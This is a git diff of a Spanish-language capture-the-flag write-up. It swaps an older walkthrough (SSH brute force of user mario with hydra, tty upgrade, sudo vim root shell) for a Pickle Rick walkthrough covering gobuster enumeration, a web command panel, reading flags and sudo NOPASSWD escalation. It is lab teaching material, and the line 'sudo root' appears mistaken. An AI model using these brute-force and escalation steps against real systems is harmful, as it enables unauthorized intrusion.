@@ -48,7 +48,10 @@ A partir de lo anterior, tenemos varias opciones por donde tirar. Tenemos ya un 
 hydra -l R1ckRul3s - P /usr/share/wordlists/rockyou.txt ssh://10.130.133.241
 ```
 
-Sin embargo obtuve lo siguiente: does not support password authentication. Lo que indica que ssh no tiene contraseña  y por tanto no podemos usar hydra. Esto lo confirmarmos con:
+`-l` -> login (usuario a probar)
+`-P` -> password list (Indica un archivo de contraseñas)
+
+Sin embargo obtuve lo siguiente: does not support password authentication. Lo que indica que ssh no tiene contraseña, funcionaba solo por clave pública  y por tanto no podemos usar hydra. Esto lo confirmamos con:
 ```bash
 ssh -v R1ckRul3s@10.130.133.241
 ```
@@ -57,135 +60,111 @@ ssh -v R1ckRul3s@10.130.133.241
 
 Por tanto Hydra no servía.
 
-`-l` -> login (usuario a probar)
-`-P` -> password list (Indica un archivo de contraseñas)
+
 
  ### Gobuster
-He probado distintas combinaciones en gobuster para ver si encontraba algo y he encontrado un php con el siguiente comando:
- ```bash
- gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x html,php,txt,php.bak
----------------------------------------------------------------------------------
-/index.html           (Status: 200) [Size: 10701]
-/secret.php           (Status: 200) [Size: 927]  
-/server-status        (Status: 403) [Size: 275
- ```
+
+Otra posibilidad a probar es el fuzzing, que consiste en enumerar directorios y ficheros secretos. Para ello usamos la herraienta gobuster como principal. 
+He probado distintas combinaciones en gobuster para ver si encontraba algo y he encontrado un php y un txt importantes:
+```bash
+gobuster dir -u http://10.130.133.241 -w /usr/share/wordlists/dirb/common.txt
+```
+
+`-u` -> url
+`-w` -> wordlist (diccionario)
 
 Este comando utiliza una wordlist que le proporcionamos con el parámetro -w para probar posibles directorios y archivos en la web.
-El parámetro -t indica el número de hilos concurrentes, acelerando el proceso de búsqueda.
-La opción -x permite probar diferentes extensiones (por ejemplo, .php, .html) sobre cada palabra de la wordlist.
+El parámetro -t indica el número de hilos concurrentes (aunque no hace falta), acelerando el proceso de búsqueda.
+La opción -x permite probar diferentes extensiones (por ejemplo, .php, .html) sobre cada palabra de la wordlist. Eso lo usé luego.
 
-En conjunto, Gobuster intenta encontrar archivos o directorios en la URL o IP que le indicamos, que en este caso corresponde a la máquina objetivo donde está alojada la página web y la plantilla de Apache.
+Aquí solo encontré un .txt (robots.txt) que contenía lo que parecía una contraseña: Wubbalubbadubdub
 
-![Gobuster](/images/gobuster_1.png)
+Volví a probar gobuster con más opciones y encontré un archivo .php: 
+```bash
+gobuster dir -u http://10.130.133.241 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+```
 
-Al acceder a /secret.php podemos ver lo siguiente:
+<img width="866" height="684" alt="imagen" src="https://github.com/user-attachments/assets/447464af-3c8e-4d4f-bee2-c8246ac4592c" />
 
-![PHP](/images/secret_php.png)
+<br>
+
+El archivo importante que encontramos ahora es el .php. Lo probamos en el navegador y a su vez probamos un curl:
+```bash
+curl http://10.130.133.241/login.php
+```
+
+Aquí veíamos el html y era un formulario paa rellenar usuario y nombre. Desde el navegador probamos a acceder con el usuario y contraseña obtenidos y entramos a un panel que permite la ejecución de comandos. Aquí estarán las 3 flags.
 
 
 ## Explotación
-Solo tenemos un vector de ataque con la información que tenemos. Sabemos que está abierto el puerto 22 y que hay un usuario llamada Mario. Por tanto vamos a realizar fuerza bruta a este puerto utilizando **hydra**.
-Tenemos que usar la wordlist rockyou que viene instalada ya en Kali. Suele venir instalado pero viene en un zip por lo que hay que descomprimirlo una vez. 
-Localiza el archivo:
+
+Solo tenemos un vector de ataque y es saber usar bien los comandos de Linux desde la web esta para poder encontrar las flags. Es lo que se conoce como una web shell. Lo primero que se nos puede ocurrir es probar lo siguiente:
+```
+whoami  # www-data
+pwd     # /var/www/html
+ls -la  # index.html, login.php, portal.php, robots.txt, Sup3rS3cretPickl3Ingred.txt
+```
+
+**Ingrediente 1**
+
+Después del ls, lo normal es probar cat en todos los archivos. El cat estaba bloqueado, por lo que había que usar otro comando de lectura. Probé less, que es un visor de archivos de texto y obtuve la primera flag en el archivo Sup3rS3cretPickl3Ingred.txt
 ```bash
-ls /usr/share/wordlists/rockyou.txt.gz
+less Sup3rS3cretPickl3Ingred.txt
 ```
 
-Debería estar en:
-```swift
-/usr/share/wordlists/rockyou.txt.gz
-```
+<br>
 
-Descomprimimos el archivo  (solo lo tenemos que hacer una vez):
-sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+**Ingrediente 2**
+Para el ingrediente 2, después de ir comprobando cosas, vi que en el directorio home había dos directorios más, uno de rick (/home/rick) y otro de ubuntu (/home/ubuntu).
 
-Ahora ya podemos usar la wordlist:
-```swift
-/usr/share/wordlists/rockyou.txt
-```
-
-Bien, ahora ya podemos usar hyndra para obtener ka contraseña del usuario Mario para realizar luego ssh
-Usaremos el siguiene comando:
+Comprobé en ambos y en el directorio de rick encontré un archivo llamado `second ingredients`:
 ```bash
-hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.19.0.2 -t 4
+ls -la /home/rick
+less "/home/rick/second ingredients"
 ```
 
+Con less obtuve el segundo flag.
 
-hydra → ejecuta la herramienta Hydra.
+<br>
 
--l mario → indica el usuario único que queremos atacar, en este caso mario.
+**Ingrediente 3 - sudo mal configurado**
 
--P /usr/share/wordlists/rockyou.txt → indica la lista de contraseñas que Hydra va a probar para ese usuario.
-
-Hydra probará cada contraseña del archivo rockyou.txt contra el usuario mario.
-
-ssh://172.19.0.2 → especifica el servicio y la dirección del objetivo:
-
-ssh → protocolo que se va a atacar.
-
-172.19.0.2 → IP de la máquina donde Hydra intentará conectarse.
-
--t 4 → número de hilos concurrentes, es decir, Hydra hará 4 intentos al mismo tiempo para acelerar el proceso.
-
-
-![Hydra1](/images/hydra1.png)
-
-Obtenemos la contraseña, que como vemos es chocolate.
-
-Ya podemos realizar ssh para entrar como Mario
-
+Esta flag estaba relacionado con la **escalada de privilegios**. Para ver que podía hacer root hice lo siguiente:
 ```bash
-ssh mario@172.19.0.2
-```
-
-### Tratamiento de la tty
-
-Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:
-
-```shell
-script /dev/null -c bash 
-```
-(hacemos  **ctrl  +  Z**)
-
-```shell
-stty raw -echo; fg
-reset xterm
-stty rows 62 columns 248
-export TERM=xterm
-export SHELL=bash
-```
-
-Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina.
-Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.
-
-## Escalada de privilegios
-
-Usamos **sudo -l** para ver si podemos ejecutar algo como root:
-
-```shell
 sudo -l
------------------------
-User mario may run the following commands on 78a58e094bf9:
-    (ALL) /usr/bin/vim
 ```
 
-Podemos ejecutar **vim**. Si no sabemos como explotarlo para escalar privilegios, siempre podemos consultar -> [GTFOBins](https://gtfobins.github.io/)
+Esto muestra qué comandos puede ejecutar un usuario con sudo.
 
-```shell
-sudo vim -c ':!/bin/bash'
+Resultado:
+```bash
+User www-data may run:
+(ALL) NOPASSWD: ALL
 ```
 
-```shell
-whoami
-----------------
-root
+Esto significa:
+
+- Usuario actual: www-data
+- Puede ejecutar cualquier comando
+- Como cualquier usuario
+- Sin contraseña
+
+Por tanto comprobé:
+```bash
+sudo root
+whoami # root
 ```
 
-Hemos alcanzado el nivel de privilegios máximos en el sistema!
+Al ser root busqué en sus archivos: 
+```bash
+sudo ls -la /root/
+```
+ Y encontre un archivo 3rd.txt que parecía el último flag:
+ ```bash
+sudo less /root/3rd.txt
+```
+ Y efectivamente. 
 
 
-
-
-
-
+ Máquina completada: Pickle Rick ✅
 
